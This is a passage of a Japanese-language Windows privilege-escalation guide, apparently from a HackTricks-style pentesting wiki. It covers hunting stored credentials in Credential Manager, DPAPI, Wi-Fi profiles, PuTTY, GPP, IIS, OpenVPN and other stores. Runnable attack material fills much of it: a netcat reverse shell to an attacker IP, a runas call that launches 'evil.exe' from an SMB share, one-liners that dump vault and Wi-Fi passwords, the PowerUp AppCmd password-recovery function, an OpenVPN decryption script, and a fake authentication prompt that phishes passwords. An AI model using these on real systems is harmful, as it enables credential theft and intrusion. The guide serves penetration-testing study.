`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、平文のレジストリ上の検出事項です。`AutoAdminLogon=1` でも平文のパスワードを読み取れない場合は、手がかりにとどまります。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かは確認できません。認証情報の露出として報告する前に、アクセス権と実際のログオン設定を確認してください。

### 資格情報マネージャー / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせる**ために使える、サーバー、Webサイト、その他のプログラム用のユーザー資格情報を保存します。一見すると、Facebook、Twitter、Gmail などのサイトの資格情報をユーザーが保存すれば、ブラウザーが自動的にログインできるように思えるかもしれませんが、そういう仕組みではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための資格情報を保存します。つまり、リソース（サーバーやWebサイト）へのアクセスに資格情報が必要な**Windows アプリケーションであれば、この Credential Manager と Windows Vault を利用し**、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された資格情報を使用できます。

アプリケーションが Credential Manager と連携していない限り、指定されたリソースの資格情報を利用できるとは思いません。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、デフォルトのストレージ vault からそのリソースの資格情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている資格情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

次に、保存された認証情報を使うために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使用して`runas`を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)から実行できることに注意してください。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文のパスワードを、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`なしで、ネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文のパスワードを即座にdumpして復号できます：

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API（DPAPI）**は、データを対称暗号化する方法を提供します。主にWindowsオペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPIでは、ユーザーのログインシークレットから導出された対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPIで暗号化されたユーザーRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`はユーザーの[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに格納されているDPAPIキー**は、通常、64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDで`dir`コマンドを使って内容を一覧表示することはできませんが、PowerShellでは一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して **mimikatz module** `dpapi::masterkey` を使用すると、復号できます。

**マスターパスワードで保護された認証情報ファイル**は通常、次の場所にあります:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey`に適切な値を指定して、**mimikatz module**の`dpapi::cred`を使用すると復号できます。\
root権限があれば、`sekurlsa::dpapi` moduleを使って**メモリ**から多数の**DPAPI** **masterkeys**を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 資格情報

**PowerShell 資格情報**は、暗号化された資格情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使用されます。資格情報は**DPAPI**で保護されているため、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた資格情報のファイル名や`.xml`のパスは任意です。スクリプトやファイルの一覧から対象ファイルが見つかった場合は、`C:\Users`にあると決めつけず、アカウントの実際のプロファイルディレクトリを確認してください: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れたとしても、それは手掛かりにすぎません。[Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、取得したアカウントが対象のサービスに対する有効な権限を持つかどうかは、別途確認が必要です。通常の列挙では、暗号化された値や平文の値を出力せず、まずパスとACLを確認してください。

ファイルに保存されたPS資格情報を**復号**するには、次のようにします:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` で確認できます

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg files を復号**します\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから多数の DPAPI masterkeys を**抽出**できます

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象です。XML ファイルを認証情報の手掛かりとして扱う前に、接続スキーマと暗号化された `Password` attributes を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかはファイルの暗号化設定と、カスタムの master password が使用されたかどうかによります。広範な列挙中に暗号化された値を表示するのは避けてください。

**Remote Desktop Plus の profile exports** も、ユーザーディレクトリや共有の管理用フォルダー内に読み取り可能な状態で存在することがあります。従来形式の `profiles.xml` export には、`ProfileName`、`Password`、`Secure` elements を含む `Data/Profile` entries があります。password element が空でなければ、表示したり平文と決めつけたりせずに、認証情報の手掛かりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、profile protection は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。これを信頼する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Windows workstation では、データベースファイルだと気付かずに、StickyNotes app に**パスワード**などの情報を保存していることがよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、必ず検索して調べる価値があります。

付箋アプリにパスワードなどの情報を保存する人もいます。Microsoft のパッケージ版 Sticky Notes app は、一般に `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にメモを保存します。古いアプリや別のアプリでは、LevelDB を含む別のユーザープロファイル内のストアを使用する場合があります。SQLite ファイルが見つからないことをメモが存在しない証拠とみなす前に、インストールされている app とストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近 commit されたメモが含まれないことがあります。データベースの一貫性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保管してください。利用可能であれば `plum.sqlite-shm` も含めます。shared-memory index は再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL documentation](https://www.sqlite.org/wal.html) を参照してください。アカウント名やパスワードを含むメモは、あくまで認証情報の手掛かりです。アカウントと許可されたアクセスを確認し、パスワードが再利用されているかどうかも別途確認してください。暗号化された password-manager record から高権限のログインを確認するには、実際の復号キーと、アプリ固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` directory にあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復元**できる可能性があります。

この code は [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行されるため**、**DLL Sideloading に脆弱な場合があります（情報元: ** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

一部の古いリモートサポート製品では、固定されたアプリケーションのレジストリキーに、パスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` は、バージョン 9 より前では設定済みの固定セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。その認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データの有無や形式、現在の認証動作を確認してください。リモートサポート用パスワードから、より高い権限を持つ Windows アカウントに至るには、そのアカウントで実際にパスワードが再利用されており、かつそのアカウントへのアクセスが許可されている必要があります。暗号文や復元したパスワードを、通常の列挙出力に含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシート保護や非表示列を区別してください。[Microsoft の説明](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシート保護は編集を制限するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されていることを示しません。許可された関連ファイルのみを調査し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CI サーバーに残る変更パッチ

CI サーバーには、ビルドの完了後も、送信されたソース変更がデータディレクトリに残ることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` はリモート実行の変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも `ProgramData` 配下にあるとは限りません。読み取り可能なパッチに、認証情報ファイル、暗号化キー、またはその両方を使用するスクリプトへの参照が、削除または追加された状態で残っている場合があります。たとえば、PowerShell の `ConvertTo-SecureString -Key` ワークフローでは、暗号化文字列に加えて AES キーも必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定されます。まずアクセス可能なパッチ名のみを確認し、次に許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限でのアクセスを証明できません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### 独自のローカル管理者パスワードローテーション

独自に作成されたパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存しながら、データストアの認証情報を読み取り可能な `.env` ファイルやアップデーターのバイナリと同じ場所に保持していることがあります。アップデーターのスケジュールタスク、アカウント、構成ファイルの ACL、リスナー、データストアの権限をまとめて確認してください。ループバックのみで待ち受けるデータストアも、有効な認証情報を持つローカルユーザーから到達できますが、認証に成功しただけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文と同じ場所からアクセスできる場合は、暗号化を信頼する前に、正確な鍵導出方法を確認してください。露出したシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードを保護する用途には適していません。Go のドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを権限昇格経路として扱う前に、それが現在も有効であり、ローカルの Administrators グループに属するアカウントのものであることを確認してください。スケジュールタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件は何も証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra によるストレージとアクセス制御は、独自のローカルデータストアとは異なります。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Java サーバーのプラグインアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されています。読み取り可能なカスタムプラグインには、埋め込みのサービス認証情報を含む構成やバイトコードが存在することがあります。許可を得た場合に限りアーカイブを調査し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在を証明できません。また、復元したサービスパスワードから高い権限を得られるのは、より高い権限を持つアカウントでもそのパスワードが有効な場合に限られます。該当ファイルの ACL を確認し、再利用された認証情報は別々の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire インストールでは、`Openfire\embedded-db` 配下に `openfire.script` が保存されていることがあります。現在のアカウントで読み取り可能な場合は、`OFUSER` レコードと `passwordKey` プロパティを併せて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存することも、このプロパティに保持されたキーで暗号化することもできます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID に対しても現在有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ確認の手がかりです。データベースの内容や認証情報を通常の列挙出力に含めないでください。

別のファイルである `Openfire\conf\openfire.xml` には、外部データベースを使用している場合でも、管理コンソールの設定ポートとバインドインターフェースが記載されていることがあります。Openfire の管理コンソールは通常ループバックにバインドされますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに到達できる場合があります。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの実行 ID をまとめて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスが LocalSystem として実行されている場合、その権限は非常に高い可能性があります。一致するアカウントパスワードや読み取り可能な構成パスだけでは、管理コンソールへのアクセスもコード実行も証明できません。ベンダーの[インストールとプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)および[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの構成

一般に `server.config.yaml` という名前の Velociraptor サーバー構成には、内部 CA の `CA.private_key` が含まれることがあります。低い権限のユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。それによって高い権限を得られるかどうかは、サーバーのユーザーロール、API への到達可能性、サーバーまたは対象エージェントの実行 ID によって異なります。クライアント構成には別の情報が含まれます。クライアント構成が見つかっても、サーバー CA へのアクセスがあるとは限りません。CA の秘密鍵をオフラインで保管している環境もあるため、読み取り可能なサーバー構成にも署名キーが含まれていない場合があります。

Windows サーバーでは、インストールディレクトリにある**サーバー**構成ファイルと、保護されたバックアップの ACL を調べてください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` ですが、異なる場合はサービスに設定されたパスを使用してください。現在の ID でファイルを読み取れること、および `CA.private_key` が実際に存在することを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使用してクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスや再起動が必要になることがあります。これらの書き込みができなくても、既存の高権限サーバー ID が経路となる場合があります。実行権限を持つ API クエリは、該当するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限を持つ場合があります。

サーバー構成とバックアップは制限的な ACL で保護し、可能な場合は CA 署名キーをオフラインで保管してください。また、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ構成ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty の認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があります。一方、エクスポートされたセッションバックアップは `sessions-backup.dat` という名前で、別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートデータはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けが含まれる場合があります。また、[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSHホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH キー

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されている場合があるため、何か興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリがあれば、保存された SSH key の可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この technique はもう有効ではないようです。SSH keys を作成し、`ssh-add` で追加してから、SSH 経由でマシンにログインしようとしました。レジストリの HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも公開鍵認証中に `dpapi.dll` が使用されていることは確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセス可能なバックアップディレクトリやイメージディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検知のよくある原因です。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences（GPP）を通じて、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存される Group Policy Objects（GPO）は、ドメインユーザーなら誰でもアクセスできました。第二に、GPP 内のパスワードは、公開されているデフォルトキーを使って AES256 で暗号化されていたため、認証済みユーザーなら誰でも復号できました。これにより、ユーザーが昇格した権限を取得する深刻なリスクが生じていました。

このリスクを軽減するため、空でない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP とファイルの場所に関する詳細が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vista より前）_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには：**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

Webroot に直接置かれた古い ZIP バックアップから、以前の設定ファイルや再利用可能な認証情報が漏えいすることがあります。これを露出と判断する前に、サイトに設定されている物理パスと、アーカイブが実際に HTTP 経由でアクセス可能かを確認してください。既定の `C:\inetpub\wwwroot` パスは候補の一つにすぎません。簡単なローカル調査では、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、回収した認証情報によってより高い権限が得られることも確認できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っている可能性があると思うなら、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**こともできます（クライアントに**認証情報**を直接**尋ねる**のは非常に**リスクが高い**ことに注意してください）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
